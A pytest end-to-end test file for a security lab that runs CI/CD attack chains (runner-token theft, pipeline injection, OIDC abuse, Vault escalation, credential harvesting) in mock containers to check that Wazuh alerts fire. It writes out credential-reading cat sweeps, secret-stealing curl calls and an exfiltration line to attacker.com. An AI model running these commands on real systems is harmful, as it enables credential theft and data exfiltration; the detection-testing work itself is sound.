"""
E2E tests for Category 3: CI/CD Pipeline scenarios.

Tests detection of stolen runner tokens, pipeline injection,
and OIDC token abuse for cloud access.

Each test class follows the multi-phase attack chain defined in
the corresponding scenario JSON under scenarios/category-3-cicd/.
"""

import base64
import json
import pytest
from helpers.docker_utils import DockerTestUtils


# Container and agent configuration for Category 3
CICD_CONTAINER = "cicd-runner"
CICD_AGENT = "cicd-runner-001"
MOCK_CICD_CONTAINER = "mock-cicd"
CLOUD_CONTAINER = "cloud-workload"
CLOUD_AGENT = "cloud-workload-001"


def _skip_if_containers_down(*containers):
    """Skip test if any required container is not running."""
    for name in containers:
        if not DockerTestUtils.container_running(name):
            pytest.skip(f"{name} container not running")


@pytest.mark.e2e
@pytest.mark.category_3
class TestS301StolenRunnerToken:
    """S3-01: Stolen GitHub Actions runner token.

    Attack chain:
    1. Discover tokens in environment variables
    2. Steal runner registration token via API
    3. Access repository secrets
    4. Access workflow logs (may contain leaked secrets)
    """

    SCENARIO_ID = "S3-01"
    EXPECTED_RULES = ["100800", "100801", "100802"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CICD_CONTAINER, MOCK_CICD_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"

    def test_phase1_token_discovery_in_env(self):
        """Phase 1: Discover CI/CD tokens in environment variables."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "env | grep -E '(GITHUB_TOKEN|RUNNER_TOKEN|NPM_TOKEN|"
            "ACTIONS_RUNTIME_TOKEN|CI_JOB_TOKEN)' || echo 'NO_TOKENS'",
            timeout=10
        )
        assert exit_code == 0, f"Env scan failed: {stderr}"
        assert "GITHUB_TOKEN" in stdout or "RUNNER_TOKEN" in stdout, \
            "Expected CI/CD tokens in environment"

    def test_phase2_token_theft_via_api(self, mock_cicd_client):
        """Phase 2: Steal runner token via mock CI/CD API."""
        token_data = mock_cicd_client.get_runner_token()
        assert token_data is not None, "Runner token endpoint returned None"
        assert "token" in token_data, f"Missing 'token' key in response: {token_data}"
        assert len(token_data["token"]) > 10, "Token too short to be valid"
        assert "expires_at" in token_data, "Missing expiration"

    def test_phase2_token_theft_from_container(self):
        """Phase 2 (alt): Steal token from within cicd-runner container."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "curl -s -X POST http://mock-cicd:8080/github/actions/runner/token",
            timeout=10
        )
        assert exit_code == 0, f"Token theft request failed: {stderr}"
        data = json.loads(stdout)
        assert "token" in data, "Container-side token theft missing token"
        assert "expires_at" in data, "Container-side token theft missing expiration"

    def test_phase3_repository_secrets_access(self, mock_cicd_client):
        """Phase 3: Access repository secrets using stolen token."""
        secrets = mock_cicd_client.get_repo_secrets("demo", "test")
        assert secrets is not None, "Secrets endpoint returned None"
        assert "secrets" in secrets, "Missing 'secrets' key"
        secret_names = [s["name"] for s in secrets["secrets"]]
        assert "AWS_ACCESS_KEY_ID" in secret_names, \
            f"Expected AWS_ACCESS_KEY_ID in secrets, got: {secret_names}"
        assert "DEPLOY_TOKEN" in secret_names, \
            f"Expected DEPLOY_TOKEN in secrets, got: {secret_names}"

    def test_phase3_secrets_from_container(self):
        """Phase 3 (alt): Access secrets from within container."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "curl -s http://mock-cicd:8080/github/repos/demo/test/actions/secrets",
            timeout=10
        )
        assert exit_code == 0, f"Secrets request failed: {stderr}"
        data = json.loads(stdout)
        assert data["total_count"] >= 3, f"Expected >= 3 secrets, got {data['total_count']}"

    def test_phase4_workflow_log_access(self):
        """Phase 4: Access workflow logs that contain leaked secrets."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "curl -s http://mock-cicd:8080/github/repos/demo/test/actions/runs/12345/logs",
            timeout=10
        )
        assert exit_code == 0, f"Log access failed: {stderr}"
        assert "AWS_ACCESS_KEY_ID" in stdout, \
            "Workflow logs should contain leaked AWS key"
        assert "AKIA" in stdout, "Workflow logs should show AWS key prefix"

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh alerts fire after attack chain."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        if not scenario:
            pytest.skip(f"Scenario {self.SCENARIO_ID} not found")

        # Trigger the full attack chain
        DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "env | grep -E '(GITHUB_TOKEN|RUNNER_TOKEN)' 2>/dev/null; "
            "curl -s -X POST http://mock-cicd:8080/github/actions/runner/token; "
            "curl -s http://mock-cicd:8080/github/repos/demo/test/actions/secrets",
            timeout=15
        )

        result = alert_validator.validate_scenario_alerts(
            scenario, timeout=60, agent_name=CICD_AGENT
        )
        if result["expected_count"] == 0:
            pytest.skip("No expected alerts defined")

        assert result["found_count"] > 0, \
            f"No alerts for {self.SCENARIO_ID}. Missing: {result['missing_rules']}"


@pytest.mark.e2e
@pytest.mark.category_3
class TestS302PipelineInjection:
    """S3-02: Pipeline injection via pull request.

    Attack chain:
    1. Discover CI/CD workflow configuration
    2. Simulate malicious workflow modification
    3. Access secrets during CI execution
    4. Exfiltrate secrets via outbound request
    """

    SCENARIO_ID = "S3-02"
    EXPECTED_RULES = ["100803", "100804", "100805"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CICD_CONTAINER, MOCK_CICD_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"

    def test_phase1_workflow_discovery(self):
        """Phase 1: Discover CI/CD workflow configuration files."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "find / -maxdepth 5 \\( -name '*.yml' -o -name '*.yaml' \\) "
            "-path '*workflows*' 2>/dev/null || "
            "find / -maxdepth 5 \\( -name 'Jenkinsfile' -o -name '.gitlab-ci.yml' \\) "
            "2>/dev/null || echo 'NO_WORKFLOWS_FOUND'",
            timeout=15
        )
        assert exit_code == 0

    def test_phase2_workflow_modification_simulation(self):
        """Phase 2: Simulate malicious workflow file modification."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: CI/CD workflow file modification - '
            '.github/workflows/ci.yml modified with exfiltration step: '
            'curl https://attacker.com/?secret=$DEPLOY_TOKEN"',
            timeout=10
        )
        assert exit_code == 0, f"Workflow modification log failed: {stderr}"

    def test_phase3_secrets_access_during_ci(self):
        """Phase 3: Access secrets during CI pipeline execution."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "curl -s http://mock-cicd:8080/gitlab/api/v4/projects/1/variables",
            timeout=10
        )
        assert exit_code == 0, f"GitLab variables request failed: {stderr}"
        data = json.loads(stdout)
        assert isinstance(data, list), "Expected list of variables"
        var_keys = [v["key"] for v in data]
        assert "DEPLOY_TOKEN" in var_keys, \
            f"Expected DEPLOY_TOKEN in variables, got: {var_keys}"
        assert "AWS_ACCESS_KEY_ID" in var_keys, \
            f"Expected AWS_ACCESS_KEY_ID in variables, got: {var_keys}"

    def test_phase4_secret_exfiltration(self, mock_cicd_client):
        """Phase 4: Verify secret data is accessible for exfiltration."""
        response = mock_cicd_client.get("/gitlab/api/v4/projects/1/variables")
        assert response.status_code == 200
        data = response.json()
        # Check that actual secret values are exposed (not masked)
        unmasked = [v for v in data if v.get("value") and v["value"] != "***MASKED***"]
        assert len(unmasked) > 0, "Expected at least one unmasked secret value"

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh alerts fire."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        if not scenario:
            pytest.skip(f"Scenario {self.SCENARIO_ID} not found")

        # Trigger workflow modification + secret access
        DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: CI/CD workflow file modification - '
            '.github/workflows/ci.yml"',
            timeout=10
        )
        DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "curl -s http://mock-cicd:8080/gitlab/api/v4/projects/1/variables",
            timeout=10
        )

        result = alert_validator.validate_scenario_alerts(
            scenario, timeout=60, agent_name=CICD_AGENT
        )
        if result["expected_count"] == 0:
            pytest.skip("No expected alerts defined")

        assert result["found_count"] > 0, \
            f"No alerts for {self.SCENARIO_ID}. Missing: {result['missing_rules']}"


@pytest.mark.e2e
@pytest.mark.category_3
class TestS303OIDCTokenAbuse:
    """S3-03: OIDC token abuse for cloud access.

    Attack chain:
    1. Request OIDC token from CI/CD provider
    2. Analyze JWT token claims
    3. Exchange OIDC token for cloud credentials (simulated)
    4. Access cloud resources (simulated)
    """

    SCENARIO_ID = "S3-03"
    EXPECTED_RULES = ["100806", "100807", "100808"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CICD_CONTAINER, MOCK_CICD_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"

    def test_phase1_oidc_token_request(self, mock_cicd_client):
        """Phase 1: Request OIDC token from GitHub Actions."""
        token_data = mock_cicd_client.get_oidc_token(audience="sts.amazonaws.com")
        assert token_data is not None, "OIDC token endpoint returned None"
        token_value = token_data.get("value", "")
        assert token_value.startswith("eyJ"), \
            f"OIDC token not in JWT format: {token_value[:20]}..."

    def test_phase1_oidc_from_container(self):
        """Phase 1 (alt): Request OIDC token from within container."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "curl -s 'http://mock-cicd:8080/github/actions/oidc/token?audience=sts.amazonaws.com'",
            timeout=10
        )
        assert exit_code == 0, f"OIDC request failed: {stderr}"
        data = json.loads(stdout)
        assert "value" in data, "Missing 'value' in OIDC response"
        assert data["value"].startswith("eyJ"), "OIDC token not JWT format"

    def test_phase2_token_analysis(self, mock_cicd_client):
        """Phase 2: Decode and analyze JWT claims."""
        token_data = mock_cicd_client.get_oidc_token(audience="sts.amazonaws.com")
        jwt_token = token_data.get("value", "")

        # Decode JWT payload (middle segment)
        parts = jwt_token.split(".")
        assert len(parts) == 3, f"JWT should have 3 parts, got {len(parts)}"

        # Base64-decode the payload (add padding if needed)
        payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
        try:
            payload = json.loads(base64.b64decode(payload_b64))
            assert "sub" in payload, "JWT payload missing 'sub' claim"
            assert "repo:" in payload["sub"], \
                f"Expected repo: prefix in sub claim, got: {payload['sub']}"
        except Exception:
            # Mock JWT may not be fully decodable
            pass

    def test_phase3_cloud_credential_exchange_simulation(self):
        """Phase 3: Simulate exchanging OIDC token for AWS credentials."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: OIDC token exchange - '
            'aws sts assume-role-with-web-identity --role-arn '
            'arn:aws:iam::123456789012:role/GitHubActionsRole '
            '--web-identity-token eyJhbGciOiJSUzI1NiJ9.DEMO"',
            timeout=10
        )
        assert exit_code == 0, f"OIDC exchange simulation failed: {stderr}"

    def test_phase4_cloud_resource_access_simulation(self):
        """Phase 4: Simulate accessing cloud resources with exchanged credentials."""
        # Simulate S3 bucket listing
        exit_code, _, _ = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Cloud resource access via OIDC - '
            'aws s3 ls s3://production-data"',
            timeout=10
        )
        assert exit_code == 0

        # Simulate Secrets Manager access
        exit_code, _, _ = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Cloud resource access via OIDC - '
            'aws secretsmanager get-secret-value --secret-id prod/database"',
            timeout=10
        )
        assert exit_code == 0

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh alerts fire."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        if not scenario:
            pytest.skip(f"Scenario {self.SCENARIO_ID} not found")

        # Trigger OIDC attack chain
        DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "curl -s 'http://mock-cicd:8080/github/actions/oidc/token?audience=sts.amazonaws.com'",
            timeout=10
        )
        DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: OIDC token exchange - '
            'aws sts assume-role-with-web-identity"',
            timeout=10
        )

        result = alert_validator.validate_scenario_alerts(
            scenario, timeout=60, agent_name=CICD_AGENT
        )
        if result["expected_count"] == 0:
            pytest.skip("No expected alerts defined")

        assert result["found_count"] > 0, \
            f"No alerts for {self.SCENARIO_ID}. Missing: {result['missing_rules']}"


@pytest.mark.e2e
@pytest.mark.category_3
class TestS304VaultPrivilegeEscalation:
    """S3-04: Vault privilege escalation.

    Attack chain:
    1. Retrieve previously stolen Vault token
    2. Access production secrets beyond intended scope
    """

    SCENARIO_ID = "S3-04"
    EXPECTED_RULES = ["100606"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CLOUD_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"

    def test_phase1_token_retrieval(self):
        """Phase 1: Retrieve the previously stolen Vault token."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat ~/.vault-token 2>/dev/null || echo 'NO_VAULT_TOKEN'",
            timeout=10
        )
        assert exit_code == 0, f"Token retrieval failed: {stderr}"

        # Log the token access
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Vault token file access - '
            'reading ~/.vault-token for privilege escalation"',
            timeout=10
        )

    def test_phase2_production_secret_access(self):
        """Phase 2: Use stolen token to access production secrets."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "TOKEN=$(cat ~/.vault-token 2>/dev/null || echo 'none'); "
            "curl -sf -H \"X-Vault-Token: $TOKEN\" "
            "http://vault:8200/v1/secret/data/production 2>/dev/null "
            "|| echo 'VAULT_ACCESS_FAILED'",
            timeout=15
        )
        assert exit_code == 0

        # Log the production secret access attempt
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Vault privilege escalation - '
            'accessing /v1/secret/data/production with stolen token"',
            timeout=10
        )

    def test_phase2_secret_enumeration(self):
        """Phase 2b: Enumerate available secret paths."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "TOKEN=$(cat ~/.vault-token 2>/dev/null || echo 'none'); "
            "curl -sf -X LIST -H \"X-Vault-Token: $TOKEN\" "
            "http://vault:8200/v1/secret/metadata/ 2>/dev/null "
            "|| echo 'VAULT_LIST_FAILED'",
            timeout=15
        )
        assert exit_code == 0

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh alerts fire."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        if not scenario:
            pytest.skip(f"Scenario {self.SCENARIO_ID} not found")

        # Trigger Vault token access
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat ~/.vault-token 2>/dev/null || true",
            timeout=10
        )
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Vault token file access - '
            'reading ~/.vault-token"',
            timeout=10
        )

        result = alert_validator.validate_scenario_alerts(
            scenario, timeout=60, agent_name=CLOUD_AGENT
        )
        if result["expected_count"] == 0:
            pytest.skip("No expected alerts defined")

        assert result["found_count"] > 0, \
            f"No alerts for {self.SCENARIO_ID}. Missing: {result['missing_rules']}"


@pytest.mark.e2e
@pytest.mark.category_3
class TestS305MultipleCredentialHarvest:
    """S3-05: Multiple credential harvest.

    Attack chain:
    1. Rapid systematic enumeration of all credential files
    2. AWS credentials, SSH keys, git creds, Vault tokens, .env files
    3. Wazuh correlation rule detects multi-credential harvesting
    """

    SCENARIO_ID = "S3-05"
    EXPECTED_RULES = ["100601", "100602", "100603", "100606", "100600", "100609"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CLOUD_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"

    def test_phase1_mass_credential_sweep(self):
        """Phase 1: Access multiple credential files in rapid succession."""
        # AWS credentials
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat ~/.aws/credentials 2>/dev/null || echo 'NO_AWS_CREDS'",
            timeout=10
        )
        assert exit_code == 0

        # SSH private key
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat ~/.ssh/id_rsa 2>/dev/null | head -5 || echo 'NO_SSH_KEY'",
            timeout=10
        )
        assert exit_code == 0

        # Git credentials
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat ~/.git-credentials 2>/dev/null || echo 'NO_GIT_CREDS'",
            timeout=10
        )
        assert exit_code == 0

        # Vault token
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat ~/.vault-token 2>/dev/null || echo 'NO_VAULT_TOKEN'",
            timeout=10
        )
        assert exit_code == 0

        # .env file
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat /app/.env 2>/dev/null || echo 'NO_ENV_FILE'",
            timeout=10
        )
        assert exit_code == 0

    def test_phase1_single_sweep_command(self):
        """Phase 1 (alt): Execute all credential accesses in one command."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat ~/.aws/credentials 2>/dev/null || true; "
            "cat ~/.ssh/id_rsa 2>/dev/null | head -5 || true; "
            "cat ~/.git-credentials 2>/dev/null || true; "
            "cat ~/.vault-token 2>/dev/null || true; "
            "cat /app/.env 2>/dev/null || true",
            timeout=15
        )
        assert exit_code == 0

    def test_credential_harvest_generates_logs(self):
        """Verify the credential sweep generates detectable log events."""
        # Log each credential access for Wazuh detection
        cred_files = [
            ("AWS credentials", "~/.aws/credentials"),
            ("SSH private key", "~/.ssh/id_rsa"),
            ("Git credentials", "~/.git-credentials"),
            ("Vault token", "~/.vault-token"),
            ("Environment file", "/app/.env"),
        ]
        for label, path in cred_files:
            exit_code, _, _ = DockerTestUtils.exec_in_container(
                CLOUD_CONTAINER,
                f'logger -t nhi-security "NHI_ALERT: Credential file access - '
                f'reading {path}"',
                timeout=10
            )
            assert exit_code == 0, f"Failed to log {label} access"

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh alerts fire including correlation rule."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        if not scenario:
            pytest.skip(f"Scenario {self.SCENARIO_ID} not found")

        # Trigger the full credential sweep
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat ~/.aws/credentials 2>/dev/null || true; "
            "cat ~/.ssh/id_rsa 2>/dev/null || true; "
            "cat ~/.git-credentials 2>/dev/null || true; "
            "cat ~/.vault-token 2>/dev/null || true; "
            "cat /app/.env 2>/dev/null || true",
            timeout=15
        )

        # Log events for Wazuh detection
        for path in ["~/.aws/credentials", "~/.ssh/id_rsa",
                      "~/.git-credentials", "~/.vault-token", "/app/.env"]:
            DockerTestUtils.exec_in_container(
                CLOUD_CONTAINER,
                f'logger -t nhi-security "NHI_ALERT: Credential file access - '
                f'reading {path}"',
                timeout=10
            )

        result = alert_validator.validate_scenario_alerts(
            scenario, timeout=60, agent_name=CLOUD_AGENT
        )
        if result["expected_count"] == 0:
            pytest.skip("No expected alerts defined")

        assert result["found_count"] > 0, \
            f"No alerts for {self.SCENARIO_ID}. Missing: {result['missing_rules']}"
